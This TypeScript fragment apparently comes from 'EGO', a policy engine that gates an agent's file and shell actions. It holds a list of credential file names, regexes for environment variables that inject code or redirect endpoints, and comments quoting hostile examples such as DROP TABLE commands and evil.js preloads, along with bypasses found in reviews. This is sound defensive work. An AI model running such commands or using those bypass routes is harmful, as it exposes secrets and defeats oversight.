        /* the directory does not exist yet */
      }
    }
  }
  const out = { dirs: [...dirs], files: [...files] };
  hooksDirCache.set(ctx, out);
  return out;
}

/** The names a credential file is given. A wildcard cannot be classified as a path, so it is asked of these. */
const SECRET_FILE_NAMES: readonly string[] = [
  '.env',
  '.env.local',
  '.env.development',
  '.env.production',
  '.env.staging',
  '.env.test',
  '.env.prod',
  '.env.dev',
  '.env.development.local',
  '.env.production.local',
  '.env.staging.local',
  '.env.test.local',
  '.envrc',
  '.npmrc',
  '.netrc',
  '.pypirc',
  '.git-credentials',
  'id_rsa',
  'id_ed25519',
  'id_ecdsa',
  'credentials',
  'credentials.json',
  'secrets.json',
  'secrets.yaml',
  'terraform.tfvars',
  'server.pem',
  'private.key',
];

/** A file-name glob (`.env*`, `*.{pem,key}`, `.e[n]v`) as a regular expression, or null when it is not one this
 *  can read. Only the last path segment: the caller has already split off the directory. */
function tailGlobRegExp(glob: string): RegExp | null {
  let re = '^';
  let inBraces = false;
  for (let i = 0; i < glob.length; i++) {
    const ch = glob[i]!;
    if (ch === '*') {
      while (glob[i + 1] === '*') i++;
      re += '.*';
    } else if (ch === '?') re += '.';
    else if (ch === '[') {
      const end = glob.indexOf(']', i + 2);
      if (end < 0) return null;
      re += '[' + glob.slice(i + 1, end).replace(/^!/, '^').replace(/\\/g, '\\\\') + ']';
      i = end;
    } else if (ch === '{') {
      inBraces = true;
      re += '(?:';
    } else if (ch === '}' && inBraces) {
      inBraces = false;
      re += ')';
    } else if (ch === ',' && inBraces) re += '|';
    else if ('\\^$.|+()[]{}'.includes(ch)) re += `\\${ch}`;
    else re += ch;
  }
  if (inBraces) return null;
  try {
    return new RegExp(re + '$', 'i');
  } catch {
    return null;
  }
}

export function classifyPath(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  tool: 'Read' | 'Write' | 'Edit',
  rawPath: string,
): CapabilityHit {
  const homed = expandHome(rawPath) ?? rawPath;
  const abs = isAbsolute(homed) ? homed : resolve(ctx.cwd ?? process.cwd(), homed);
  if (tool !== 'Read' && ctx.egoHome && 'ego.trust.tamper' in table.capabilities) {
    const home = canonicalPath(ctx.egoHome).split(sep).join('/');
    const posix = canonicalPath(abs).split(sep).join('/');
    // EGO_HOME is EGO's OWN runtime state, not just its trust directories: the index that records which runtime
    // is trusted, the cache it is loaded from, the pins. Protecting only `trust/` left `index.json` writable, and
    // that file decides which runtime EGO believes in (exit review). A path matcher cannot cover this, because
    // EGO_HOME is wherever the operator put it.
    if (posix === home || posix.startsWith(home + '/')) {
      return {
        capability: 'ego.trust.tamper',
        verdict: verdictFor(table, ctx, 'ego.trust.tamper'),
        via: underTrustDir(posix, home) ? 'EGO_HOME trust store' : 'EGO_HOME runtime state',
        absolute: true,
      };
    }
  }
  for (const m of table.matchers) {
    if (!m.path) continue;
    // `any` MEANS EVERY TOOL, and it is the SILENT DEFAULT for a matcher that omits `tool:`. `classifyCommand`
    // and `classifyUrl` both honour it; this one did not, so a path rule written without a `tool:` key — the
    // single most likely authoring slip in an overlay, and the only field with a default — compiled clean, was
    // reported by nothing, and protected nothing: not Write, not Edit, not a Bash redirection. An organization
    // believing `secrets/**` was a credential store got ALLOW for every write to it (exit review 9).
    if (m.tool !== 'any' && m.tool !== tool && !(m.tool === 'Write' && tool === 'Edit')) continue;
    if (matchPathPattern(m.path, abs, ctx)) {
      return {
        capability: m.capability,
        verdict: verdictFor(table, ctx, m.capability),
        via: `matcher path ${m.path}`,
        absolute: isAbsoluteCap(table, m.capability),
      };
    }
  }
  // ...and the directory `core.hooksPath` names, wherever it is: a rule cannot list a place the repository chose
  if (tool !== 'Read' && 'fs.hook-config.write' in table.capabilities) {
    const posix = canonicalPath(abs).split(sep).join('/');
    const folded = foldName(posix);
    const hooks = configuredHooksDirs(ctx);
    const roots = ctx.repoRoots.map((r) => canonicalPath(r).split(sep).join('/'));
    const hit = (via: string): CapabilityHit => ({
      capability: 'fs.hook-config.write',
      verdict: verdictFor(table, ctx, 'fs.hook-config.write'),
      via,
      absolute: isAbsoluteCap(table, 'fs.hook-config.write'),
    });
    if (hooks.files.some((f) => foldName(f) === folded))
      return hit('a file that decides where git looks for hooks, or a hook that is a symlink to it');
    for (const dir of hooks.dirs) {
      const fd = foldName(dir);
      // a hooks path that IS the work tree (`.`) would make every file a hook: there only the hook names count
      const wholeTree = roots.some((r) => foldName(r) === fd || foldName(r).startsWith(fd + '/'));
      // the directory ITSELF counts: renaming or removing it switches every hook off, and `cp x githooks/` names it
      const isDir = folded === fd;
      const under = folded.startsWith(fd + '/');
      if ((isDir && !wholeTree) || (under && (!wholeTree || GIT_HOOK_FILE_RE.test(posix.slice(dir.length + 1)))))
        return hit(`the hooks directory core.hooksPath names (${dir})`);
    }
  }
  const inside = insideRoots(abs, ctx);
  // the OS temporary directory is scratch space unless the workspace itself lives there
  if (!inside && isScratchPath(abs)) {
    const cap = tool === 'Read' ? 'fs.scratch.read' : 'fs.scratch.write';
    return {
      capability: cap,
      verdict: verdictFor(table, ctx, cap),
      via: 'OS temporary directory',
      absolute: false,
    };
  }
  const cap =
    tool === 'Read'
      ? inside
        ? 'fs.repo.read'
        : 'fs.outside-workspace.read'
      : inside
        ? 'fs.repo.write'
        : 'fs.outside-workspace.write';
  return {
    capability: cap,
    verdict: verdictFor(table, ctx, cap),
    via: inside ? 'inside registered repository' : 'outside registered repositories',
    absolute: false,
  };
}

const MAX_EFFECT_DEPTH = 4;
const MAX_SCRIPT_BYTES = 64 * 1024;
/** classes that only say "the kernel cannot see inside"; they never escalate a command whose class the matchers declared */
const OPACITY_CLASSES = new Set(['command.unknown', 'command.interpreter-script', 'command.script-opaque']);
/** keywords that prefix a command on the same line: strip and classify the remainder (`if git push`, `do npm test`) */
// `while` and `until` are followed by a COMMAND — the loop's condition, which runs at least once — and both were
// missing, so `while psql -h prod-db… -c 'DROP TABLE users'; do break; done` kept the keyword in the segment and
// no target-aware rule could match it (exit review 8). `for` and `case` are deliberately absent: what follows
// them is a variable name and a word to match, not a command.
const PREFIX_KEYWORDS = new Set(['if', 'then', 'else', 'elif', 'do', 'while', 'until', '!', '{', '}', 'time']);
/** statements that are shell structure, never an external effect: the whole segment is skipped */
const PACKAGE_MANAGER_BUILTINS = new Set([
  'install',
  'i',
  'ci',
  'add',
  'remove',
  'rm',
  'uninstall',
  'update',
  'up',
  'upgrade',
  'link',
  'unlink',
  'publish',
  'pack',
  'init',
  'create',
  'exec',
  'dlx',
  'x',
  'npx',
  'cache',
  'config',
  'set',
  'get',
  'ls',
  'list',
  'view',
  'info',
  'why',
  'outdated',
  'audit',
  'login',
  'logout',
  'whoami',
  'version',
  'help',
  'workspaces',
  'workspace',
  'import',
  'dedupe',
  'prune',
  'rebuild',
  'root',
  'bin',
  'env',
  'store',
  'patch',
  'fetch',
  'licenses',
  'setup',
  'self-update',
  'approve-scripts',
]);

function defaultReadFile(abs: string): string | null {
  try {
    const st = statSync(abs);
    if (!st.isFile() || st.size > MAX_SCRIPT_BYTES) return null;
    return readFileSync(abs, 'utf8');
  } catch {
    return null;
  }
}

function readInsideWorkspace(ctx: EvaluationContext, abs: string): string | null {
  if (
    !insideRoots(abs, ctx) &&
    !(
      ctx.cwd &&
      canonicalPath(abs)
        .split(sep)
        .join('/')
        .startsWith(canonicalPath(ctx.cwd).split(sep).join('/') + '/')
    )
  )
    return null;
  return (ctx.readFile ?? defaultReadFile)(abs);
}

/** Finds the nearest `name` walking upward. Returns the path when the file EXISTS, whether or not we could read it:
 *  conflating "not there" with "there but unreadable" is what let an oversized or unreadable manifest keep a
 *  declared class's ALLOW (challenge finding 1). The caller decides what an unreadable one means. */
/** A REACHED CAP IS NOT AN ABSENCE. The upward walk stops after 64 levels, and returning the same `null` as a
 *  genuine miss let the caller report ABSENT_VERIFIED — the one outcome that carries a positive claim — for a
 *  manifest it simply never reached (exit review 8). The two are now different values. */
const SEARCH_EXHAUSTED = '\0exhausted';
function findUp(ctx: EvaluationContext, start: string, name: string, outward = false): string | null {
  let dir = resolve(start);
  for (let i = 0; i < 64; i++) {
    const candidate = join(dir, name);
    if (readInsideWorkspace(ctx, candidate) !== null || (insideRoots(candidate, ctx) && fileExists(candidate)))
      return candidate;
    const parent = dirname(dir);
    if (parent === dir) return null;
    // THE TOOL'S SEARCH DOES NOT STOP AT THE WORKSPACE'S EDGE. `npm run build` in a checkout with no package.json of
    // its own runs the script of the nearest manifest ABOVE it, and stopping where the registered roots end reported
    // "no package.json" as a verified absence over a file that decides what runs (exit review 10). With `outward` the
    // walk goes on by existence only, and a manifest found there is returned - the caller cannot read it, which is
    // the opacity that is true.
    if (!insideRoots(parent, ctx)) {
      if (!outward) return null;
      for (let d = parent, j = 0; j < 64; j++) {
        if (fileExists(join(d, name))) return join(d, name);
        const up = dirname(d);
        if (up === d) return null;
        d = up;
      }
      return SEARCH_EXHAUSTED;
    }
    dir = parent;
  }
  return SEARCH_EXHAUSTED;
}

/* ------------------------------------------------------------------------------------------------------------- *
 * THE VERIFIED EXECUTION ENVIRONMENT (product decision, 2026-09-22).
 *
 * `{cwd, cwdVerified}` was one dimension, and it was the only one EGO made earn its keep. Everything else that
 * decides WHICH BYTES RUN was assumed: the configuration that selects the body (git's core.hooksPath, make's
 * makefile precedence and SHELL, npm's .npmrc), the binding that turns a NAME into a PROGRAM (PATH,
 * node_modules/.bin), the freshness of the sources a conclusion rests on, and the events an operation raises.
 * Each of those silently re-points the analysis at a different reality while the verdict still says RESOLVED.
 *
 * The environment is therefore multi-dimensional, and a positive claim requires the dimensions the claim actually
 * DEPENDS ON to be proven — not all of them, which would gate ordinary work, and not just the directory, which
 * was the hole.
 * ------------------------------------------------------------------------------------------------------------- */

/** WHICH part of an execution closure could not be resolved. Opacity has a scope: a local unknown must not poison
 *  unrelated safe work, and a reader must be able to see what EGO could not see. */
export interface Unresolved {
  what: 'body' | 'config' | 'binding' | 'context' | 'freshness' | 'ambient';
  /** the specific target, file, name or event the gap is about */
  where: string;
  why: string;
}

/** How a bare NAME becomes a PROGRAM in this environment. `default` is the host's ordinary lookup, which EGO does
 *  not model and does not need to: it is the same lookup the operator already trusts. `redefined` means the
 *  environment ITSELF changes the lookup — a makefile assigning PATH or SHELL, an env-injected PATH — and then the
 *  identity of every program the body names is no longer implied by its spelling. */
export interface Binding {
  kind: 'default' | 'redefined';
  why?: string;
}

/** The execution environment a semantic conclusion was computed against. */
export interface ExecutionEnvironment {
  /** the directory this segment's relative operands resolve against */
  cwd: string;
  /** PROVEN only when that directory exists and lies inside a registered repository root. A dynamic `cd`, an
   *  unresolvable `-C`, an unmodelled workspace selector or a logical/physical disagreement all clear it. */
  cwdVerified: boolean;
  /** CONFIGURATION CLOSURE: what EGO read to know which body executes, and what it could not read. A positive
   *  claim is valid only when this is complete enough for the claim being made. */
  config: { read: string[]; unresolved: Unresolved[] };
  /** BINDING RESOLUTION: see `Binding`. */
  binding: Binding;
  /** The segment EXACTLY as written, before normalization de-quoted it. A producer that reads its own command
   *  line needs the quoting: `make V="git push origin main" run` normalizes to five bare words, and the override's
   *  value then looked like four separate targets (exit review 5). */
  rawSegment?: string;
  /** True when the body being analysed runs INSIDE a container image, so its paths are the image's and not the
   *  workspace's. `RUN go build -o /out/app .` and `RUN cp entrypoint.sh /usr/local/bin/` write nothing on the
   *  host, and judging them as host paths denied the two most generic Dockerfile idioms there are — a
   *  proportionality defect introduced by the Dockerfile producer itself (exit review 8). The COMMANDS are still
   *  classified: a `git push` or a `curl … | sh` inside a RUN is as real as anywhere else. */
  containerPaths?: boolean;
  /** THE TEXT THIS SEGMENT READS ON STANDARD INPUT, when the kernel can see it: a heredoc body. A producer that
   *  takes its own input from stdin — `docker build -f -` is the one that matters — can then read what it will
   *  actually build instead of reporting the stream as unreadable (exit review 8). Absent when the stream comes
   *  from anywhere the kernel cannot read, which stays the opacity it is. */
  stdinText?: string;
  /** Names DEFINED IN THIS UNIT whose body the analyzer already read — a shell function. A call to one of them
   *  executes text that is already accounted for, so it is neither an unknown producer nor an unresolved binding:
   *  EGO knows exactly what the name means. An ALIAS is not here, because its body is not handed over. */
  definedNames?: ReadonlySet<string>;
  /** TRANSITIVE FRESHNESS: canonical paths that an earlier unit of THIS COMMAND writes. Shared and mutated in
   *  place across every depth, so a write inside a producer body invalidates a later conclusion outside it —
   *  `./configure && make` must not reuse the Makefile configure just rewrote. */
  written: Set<string>;
  /** fingerprints of the sources this environment was built from, so a conclusion can be re-checked */
  sources: Record<string, string>;
  /** ENVIRONMENT-INPUT CLOSURE: the leading `VAR=value` assignments of this segment that MATERIALLY change
   *  execution semantics — which makefile is read, which interpreter runs a script, where a program is looked up.
   *  `normalizeSegment` strips assignments before the producer boundary, so a producer could satisfy
   *  "configuration-complete" VACUOUSLY about a tool the same command line had just re-pointed. Only the inputs
   *  needed to justify a semantic claim are captured; EGO does not model the environment. */
  envInputs: Record<string, string>;
  /** TREE-STATE PROVENANCE: false once an earlier unit of this command may have replaced the repository content
   *  that later conclusions rest on — a checkout, reset, stash pop, merge, rebase or worktree switch rewrites an
   *  unenumerable set of files, which the per-path write ledger cannot express. Recorded IN the shared ledger
   *  under a sentinel, because that is the mechanism already proven to cross the producer boundary: a checkout
   *  inside a script body must invalidate a conclusion drawn after it, one level up (challenge 8). */
  readonly treeFresh: boolean;
}

/** The environment of a fresh top-level invocation: nothing proven that was not checked. */
export function baseEnvironment(cwd: string, cwdVerified: boolean): ExecutionEnvironment {
  return {
    cwd,
    cwdVerified,
    config: { read: [], unresolved: [] },
    binding: { kind: 'default' },
    written: new Set(),
    sources: {},
    envInputs: {},
    get treeFresh(): boolean {
      return !this.written.has(TREE_DIRTY);
    },
  };
}

/** Ledger sentinel for "an earlier unit of this command replaced repository content". */
const TREE_DIRTY = '\0tree';

/** A child environment for a resolved body: a new directory and its own configuration, but the SAME write ledger,
 *  because freshness is a property of the command, not of one producer. */
function childEnvironment(
  parent: ExecutionEnvironment,
  over: Partial<Omit<ExecutionEnvironment, 'written'>>,
): ExecutionEnvironment {
  return {
    cwd: over.cwd ?? parent.cwd,
    cwdVerified: over.cwdVerified ?? parent.cwdVerified,
    config: over.config ?? { read: [], unresolved: [] },
    binding: over.binding ?? parent.binding,
    written: parent.written, // SHARED, never copied: this is what makes freshness transitive
    sources: { ...parent.sources, ...(over.sources ?? {}) },
    // a producer's body inherits the process inputs of the invocation that produced it; tree freshness is read
    // from the SHARED ledger, so it crosses the producer boundary in both directions
    envInputs: over.envInputs ?? parent.envInputs,
    get treeFresh(): boolean {
      return !parent.written.has(TREE_DIRTY);
    },
  };
}

/** Which process inputs materially change what each producer resolves. EGO does not model the environment: it
 *  captures only the inputs required to justify the semantic claim the producer is about to make. */
const PROGRAM_NAMING_ENV =
  /^(EDITOR|VISUAL|PAGER|DIFFPROG|MERGE|SSH_ASKPASS|SUDO_ASKPASS|TERMINAL|BROWSER|MANPAGER|LESSOPEN|LESSCLOSE|CC|CXX|LD|AR|RANLIB|OBJCOPY|CARGO_TARGET_[A-Z0-9_]*(RUNNER|LINKER|AR)|CARGO_BUILD_[A-Z0-9_]*(WRAPPER|RUSTC|RUSTDOC)|RUSTC_WRAPPER|RUSTC|LD_PRELOAD|DYLD_[A-Z_]+|GOFLAGS|RUSTFLAGS|CGO_[A-Z]+|CFLAGS|CXXFLAGS|LDFLAGS)$/;

const RELEVANT_ENV_INPUTS: Record<ProducerResult['kind'], readonly RegExp[]> = {
  // A variable whose VALUE IS A PROGRAM re-points the tool itself, so it is relevant to EVERY producer and to no
  // producer at all — `EDITOR=<prog> git commit` and `CC=<prog> make build` run <prog> whichever branch resolved
  // the body. Listing it per kind meant it was relevant where someone remembered to list it.
  // A MAKE RECIPE CAN RUN ANY TOOL, so every variable that changes what a tool executes is relevant to it — not
  // only make's own. `export NODE_OPTIONS := --require=./evil.js` makes every Node tool in every recipe load
  // that file, and the recipe text says nothing about it (exit review 8).
  'make-target': [
    PROGRAM_NAMING_ENV,
    /^(MAKEFILES|MAKEFLAGS|GNUMAKEFLAGS|MAKE|SHELL|PATH|NODE_OPTIONS|NODE_PATH|PYTHONPATH|PYTHONSTARTUP|PERL5OPT|RUBYOPT|BASH_ENV|ENV|GEM_PATH|CLASSPATH|JAVA_TOOL_OPTIONS)$/,
  ],
  'npm-script': [
    PROGRAM_NAMING_ENV,
    /^(npm_config_[a-z_]+|YARN_[A-Z_]+|PNPM_[A-Z_]+|BUN_[A-Z_]+|SHELL|PATH|NODE_OPTIONS|NODE_PATH)$/,
  ],
  'shell-script': [PROGRAM_NAMING_ENV, /^(SHELL|BASH_ENV|ENV|PATH|CDPATH)$/],
  'git-ambient': [PROGRAM_NAMING_ENV, /^(GIT_[A-Z_]+|PATH)$/],
  // PATH and CDPATH re-point ANY bare name, so they are relevant even where no producer ran
  none: [PROGRAM_NAMING_ENV, /^(PATH|CDPATH)$/],
};

/** ENVIRONMENT-INPUT CLOSURE and TREE-STATE PROVENANCE, applied at the ONE place that knows which producer ran —
 *  so every producer, current and future, is covered without having to remember. */
function environmentGaps(kind: ProducerResult['kind'], env: ExecutionEnvironment): Unresolved[] {
  const gaps: Unresolved[] = [];
  for (const [name, value] of Object.entries(env.envInputs))
    // ...but a VALUE that cannot name a program does not change what runs: `NODE_OPTIONS=--max-old-space-size`
    // raises the V8 heap, which is the standard fix for an out-of-memory build, and reporting it as an
    // unresolved context made `npm test` ask (exit review 7).
    if (RELEVANT_ENV_INPUTS[kind].some((re) => re.test(name)) && envInjects(name, `${name}=${value}`))
      gaps.push({ what: 'context', where: name, why: `the environment sets ${name}=${value}, which changes what runs` });
  if (!env.treeFresh && kind !== 'none')
    gaps.push({
      what: 'freshness',
      where: 'tree-state',
      why: 'an earlier unit of this command replaces repository content, so this conclusion is a pre-image',
    });
  return gaps;
}

/** A configuration named on the COMMAND LINE rather than found on disk: `eslint --config x.js`, `vite -c v.ts`.
 *  The file lookup could never see it, so the same closure escaped through a different spelling. */
function commandLineConfig(tokens: string[], cwd: string): string | null {
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    const eq = /^(?:--config=|--configfile=|--conf=|-c)(.+)$/.exec(t);
    const value =
      (t === '--config' || t === '--configfile' || t === '--conf' || t === '-c') && tokens[i + 1]
        ? tokens[++i]!
        : (eq?.[1] ?? null);
    if (value === null) continue;
    if (/\.(js|mjs|cjs|ts|mts|cts|py|rb)$/.test(value)) return isAbsolute(value) ? value : join(cwd, value);
  }
  return null;
}

/** A DATA configuration that NAMES code is not a bounded closure: `.eslintrc.json` with `"plugins": ["x"]` makes
 *  the tool import and run `eslint-plugin-x`. The file is data; what it points at is not. Returns the config that
 *  names code, or undefined when the tool's configuration names none. */
function dataConfigNamingCode(ctx: EvaluationContext, cwd: string, tool: string): string | null {
  // the DATA configuration each tool really reads: its own dotfile, its own ini/toml, and the shared files its
  // ecosystem puts tool sections in. Looking only for `.<tool>rc*` and `package.json` missed `mypy.ini`,
  // `setup.cfg`, `pyproject.toml` and `.rubocop.yml` — the files those tools actually use.
  const names = [
    `.${tool}rc`,
    `.${tool}rc.json`,
    `.${tool}rc.yml`,
    `.${tool}rc.yaml`,
    `.${tool}rc.toml`,
    `.${tool}.yml`,
    `.${tool}.yaml`,
    `${tool}.config.json`,
    `${tool}.json`,
    `${tool}.ini`,
    `${tool}.cfg`,
    `${tool}.toml`,
    'setup.cfg',
    'pyproject.toml',
    'tox.ini',
    'Gemfile',
    'package.json',
  ];
  for (const n of names) {
    const f0 = findUp(ctx, cwd, n);
    const f = f0 === SEARCH_EXHAUSTED ? null : f0;
    if (f === null) continue;
    const text = readInsideWorkspace(ctx, f);
    if (text === null) return f; // a configuration EGO cannot read cannot be shown to name no code
    const scope =
      n === 'package.json'
        ? (() => {
            try {
              const v = (JSON.parse(text) as Record<string, unknown>)[tool];
              return v === undefined ? '' : JSON.stringify(v);
            } catch {
              return '';
            }
          })()
        : text;
    // `plugins` and the rest always name a package the tool imports. `extends` is the exception: a value in the
    // tool's OWN namespace (`eslint:recommended`) is built in and loads nothing, so flagging it would gate the
    // most ordinary configuration there is.
    // JSON writes `"plugins": ["x"]`, YAML writes `plugins:` then a list on the following lines. Requiring a
    // bracket on the same line saw only the JSON shape (decision challenge, finding 6).
    // JSON writes `"plugins": [...]`, YAML writes `plugins:` then a list, INI and TOML write `plugins = ...`.
    // Requiring a colon saw only the first two, so `mypy.ini` with `plugins = evil.py` read as plain data.
    if (
      /(^|["\s])(plugins|presets|preset|require|requires|loader|transform)["\s]*[:=]\s*(\[|\{|["']|\S|\r?\n\s*-)/m.test(
        scope,
      )
    )
      return f;
    const ext = /["\s]extends["\s]*[:=]\s*(\[[^\]]*\]|"[^"]*")/.exec(scope);
    if (ext) {
      const values = [...ext[1]!.matchAll(/"([^"]+)"/g)].map((m) => m[1]!);
      if (values.some((v) => !v.startsWith(`${tool}:`))) return f;
    }
  }
  return null;
}

/** Operations that replace repository content wholesale. Listed by what they DO, not by spelling: each one swaps
 *  an unenumerable set of tracked files, so a conclusion drawn from repository content before it is a pre-image. */
const TREE_CHANGING =
  /^git\s+(checkout|switch|restore|reset|merge|rebase|cherry-pick|revert|stash|pull|am|apply|clean|worktree|submodule|sparse-checkout|read-tree|lfs|bisect|filter-branch)\b/;

/** Leading `VAR=value` assignments of a segment. Only the names below are kept: the ones that decide WHICH FILE a
 *  tool reads or WHICH PROGRAM it runs. Everything else is ordinary parameterisation and is not execution input. */
/** AN ENDPOINT NAMED BY THE ENVIRONMENT IS THE SAME ACT AS NAMING IT ON THE LINE. `npm_config_registry=`,
 *  `PIP_INDEX_URL=`, `https_proxy=` and their neighbours point the tool somewhere else for the whole command —
 *  and the normalizer STRIPS them, because it keeps only the assignments whose value is a PROGRAM, so the
 *  explicit-endpoint matcher never saw them (exit review 10). The concern here is not code, it is destination,
 *  which is why it is tested separately and on the segment as written. A default endpoint, and localhost, are
 *  the ordinary cases and stay out. */
const ENDPOINT_ENV_NAME =
  /^(?:(?:npm|NPM)_config_(?:[A-Za-z_@:.-]*registry|[A-Za-z_]*proxy)|YARN_[A-Z_]*(?:REGISTRY|PROXY)[A-Z_]*|(?:PIP|UV|POETRY)_[A-Z_]*(?:INDEX|PROXY|FIND_LINKS)[A-Z_]*|GOPROXY|GONOSUMDB|GOSUMDB|GEM_SOURCE|NUGET_[A-Z_]*SOURCE|DOCKER_REGISTRY|HELM_REPOSITORY_CONFIG|(?:HTTPS?|ALL|FTP)_PROXY|GIT_PROXY_COMMAND|COMPOSER_REPOSITORIES|CARGO_REGISTRIES_[A-Z0-9_]+_INDEX|CARGO_HTTP_PROXY|[A-Z0-9_]*(?:_PROXY|_REGISTRY|_MIRROR|_INDEX_URL|_ENDPOINT(?:_URL)?))$/i;
const DEFAULT_ENDPOINT_HOSTS = new Set([
  'localhost', '127.0.0.1', '::1', 'registry.npmjs.org', 'registry.yarnpkg.com', 'pypi.org', 'files.pythonhosted.org',
  'proxy.golang.org', 'sum.golang.org', 'crates.io', 'index.crates.io', 'rubygems.org', 'repo1.maven.org',
]);
/** The first assignment on this segment - or in a command it carries, quoted or not - that points a package manager, a
 *  proxy-aware client or a registry-aware tool at a host that is not a default one. The HOST is parsed, userinfo
 *  included: `localhost:80@evil.example` is evil.example. null when there is none. */
function endpointEnvHit(seg: string): string | null {
  for (const text of [seg, ...carrierCommandValues(seg)]) {
    for (const m of text.matchAll(/(?:^|[\s;&|'"(])([A-Za-z_][A-Za-z0-9_]*)=('[^']*'|"[^"]*"|[^\s;&|'"]*)/g)) {
      const name = m[1]!;
      if (!ENDPOINT_ENV_NAME.test(name)) continue;
      const value = m[2]!.replace(/^['"]|['"]$/g, '');
      if (!value) continue;
      const bad = value
        .split(/[,|\s]+/)
        .filter(Boolean)
        .some((e) => {
          if (/^(direct|off)$/i.test(e)) return false;
          const h = endpointHost(e).toLowerCase();
          return !(DEFAULT_ENDPOINT_HOSTS.has(h) || h.endsWith('.localhost'));
        });
      if (bad) return `${name}=${value}`;
    }
  }
  return null;
}

const EXECUTION_ENV_INPUTS =
  // ... plus the variables whose VALUE IS A PROGRAM the tool will run: an editor, a pager, a diff or merge
  // driver, an askpass helper. `EDITOR=<prog> git commit` runs <prog> (decision challenge, finding 33).
  /^(MAKEFILES|MAKEFLAGS|MAKE|GNUMAKEFLAGS|SHELL|BASH_ENV|ENV|PS4|BASH_XTRACEFD|CDPATH|PATH|NODE_OPTIONS|NODE_PATH|npm_config_[a-z_]+|YARN_[A-Z_]+|PNPM_[A-Z_]+|BUN_[A-Z_]+|PYTHONPATH|PYTHONSTARTUP|PERL5OPT|RUBYOPT|GIT_[A-Z_]+|LD_PRELOAD|LD_LIBRARY_PATH|DYLD_[A-Z_]+|EDITOR|VISUAL|PAGER|DIFFPROG|MERGE|SSH_ASKPASS|SUDO_ASKPASS|TERMINAL|BROWSER|MANPAGER|LESSOPEN|LESSCLOSE|CC|CXX|LD|AR|RANLIB|OBJCOPY|CARGO_TARGET_[A-Z0-9_]*(RUNNER|LINKER|AR)|RUSTC_WRAPPER|RUSTC|CARGO_BUILD_RUSTC_WRAPPER|CARGO_BUILD_RUSTC|CARGO_BUILD_RUSTDOC|RUSTDOC|SWIFT_EXEC|JAVA_TOOL_OPTIONS|JDK_JAVA_OPTIONS|_JAVA_OPTIONS|LD_AUDIT|BUILDX_BUILDER|DOCKER_HOST|DOCKER_CONTEXT|CONTAINER_HOST|KUBECONFIG|KUBE_CONTEXT|AWS_ENDPOINT_URL|AWS_ENDPOINT_URL_[A-Z0-9_]+|AWS_S3_ENDPOINT|CLOUDSDK_API_ENDPOINT_OVERRIDES_[A-Z0-9_]+|(?:STORAGE|PUBSUB|FIRESTORE|DATASTORE|BIGTABLE|SPANNER)_EMULATOR_HOST|GOFLAGS|GOTOOLCHAIN|RUSTFLAGS|CGO_[A-Z]+|CFLAGS|CXXFLAGS|LDFLAGS|MAKEFLAGS)$/;

export function segmentEnvInputs(segment: string): Record<string, string> {
  const out: Record<string, string> = {};
  // A CONTAINER'S `-e` SETS THE CONTAINER'S ENVIRONMENT, not this shell's. `docker run --rm -e SHELL=/bin/sh
  // myapp` starts a throwaway local container with one variable set; reading it as a host binding classified an
  // ordinary local run as an execution override (exit review 7). What the container does with it is the
  // container's business, and the image is already an unmodelled producer.
  if (/^(docker|podman|nerdctl)\b/.test(segment.trim())) return out;
  // `VAR=x cmd`, `env VAR=x cmd`, `env -- VAR=x cmd`, `env -S 'VAR=x cmd'`, and the same behind any wrapper
  // (`timeout 60 env VAR=x cmd`). Anchoring on the LEADING position only made the dimension blind to spellings
  // the normalizer already knew how to parse — two readers for one dimension (challenge 8, finding 1).
  const scan = (text: string): void => {
    let s = text.trim();
    for (;;) {
      // skip wrappers and their options so `timeout 60 env FOO=1 make` is reached
      const w = /^(\S+)\s+/.exec(s);
      // `sudo`, `doas` and `xargs` are NOT transparent for the verdict — sudo keeps `command.privileged` — but
      // they are transparent for the ENVIRONMENT: `sudo DOCKER_HOST=tcp://prod… docker exec` really does set that
      // variable for the command. Stopping at them left the normalized `docker exec` with no engine to resolve,
      // so a shell on a production daemon asked instead of being denied (exit review 6, generated cross-product).
      // ...and so is a shell KEYWORD: a segment that begins `then`, `do` or `else` holds the same command a bare one
      // does, and the assignment in front of it configures it just the same (exit review 10, cross-product: the
      // linker variable was seen at the top of a line and missed inside every branch)
      if (w && (WRAPPERS.has(w[1]!) || PREFIX_KEYWORDS.has(w[1]!) || /^(timeout|sudo|doas|xargs|--)$/.test(w[1]!))) {
        s = s.slice(w[0].length);
        continue;
      }
      const m = /^([A-Za-z_][A-Za-z0-9_]*)=('[^']*'|"[^"]*"|\S*)\s+/.exec(s);
      if (m) {
          // npm matches `npm_config_*` case-insensitively, so `npm_config_SCRIPT_SHELL` is the same setting
      const name = /^npm_config_/i.test(m[1]!) ? m[1]!.toLowerCase() : m[1]!;
      // THE TARGET-SELECTING NAMES ARE ENVIRONMENT INPUTS TOO. `PGHOST`, `MYSQL_HOST`, `KUBECONFIG` and their
      // siblings live in TARGET_ENV_RE, which the NORMALIZER consults to re-attach an assignment to the segment
      // it configures. They were absent from this set, so a standalone `export PGHOST=prod-db.acme.com` carried
      // nothing to the next segment and `export PGHOST=… && psql -c 'DROP TABLE users'` was ALLOW, while the
      // one-segment spelling was an absolute deny (exit review 7).
      if (EXECUTION_ENV_INPUTS.test(name) || TARGET_ENV_RE.test(name))
        out[name] = m[2]!.replace(/^['"]|['"]$/g, '');
        s = s.slice(m[0].length);
        continue;
      }
      // a numeric or flag operand of a wrapper (`timeout 60`, `env -C dir`, `nice -n 5`)
      const opt = /^(-\S*|\d+\S*)\s+/.exec(s);
      if (opt && /^(-|\d)/.test(opt[1]!)) {
        s = s.slice(opt[0].length);
        // an option's VALUE is not a command either: `sudo -u root -H VAR=x cmd` stopped the scan at `root`
        if (/^(-u|-g|-p|-C|-U|-r|-t|-D|--user|--group|--prompt|--role|--type|--chdir)$/.test(opt[1]!)) {
          const val = /^(\S+)\s+/.exec(s);
          if (val && !/^[A-Za-z_][A-Za-z0-9_]*=/.test(val[1]!)) s = s.slice(val[0].length);
        }
        continue;
      }
      break;
    }
  };
  scan(segment);
  // `env -S 'VAR=x cmd'` carries a whole command line in one quoted value
  for (const carried of carrierCommandValues(segment)) scan(carried);
  return out;
}

interface EffectState {
  depth: number;
  seen: Set<string>;
  env: ExecutionEnvironment;
}

function stripComment(line: string): string {
  let out = '';
  let quote: string | null = null;
  for (let i = 0; i < line.length; i++) {
    const ch = line[i]!;
    if (quote) {
      out += ch;
      if (ch === quote) quote = null;
      continue;
    }
    if (ch === '$' && line[i + 1] === "'") {
      // `$'…'` again: the same ANSI-C string, in the reader that strips comments from a SCRIPT line
